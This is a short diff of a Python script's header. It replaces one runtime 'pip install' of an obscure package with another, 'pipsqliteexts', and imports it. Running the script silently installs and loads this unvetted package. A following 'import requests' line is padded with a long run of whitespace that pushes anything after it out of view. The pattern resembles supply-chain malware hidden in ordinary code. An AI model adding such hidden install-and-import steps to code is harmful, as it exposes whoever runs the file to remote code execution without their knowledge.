@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlitedbkit")
-import pipsqlitedbkit
+os.system("pip install pipsqliteexts")
+import pipsqliteexts
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
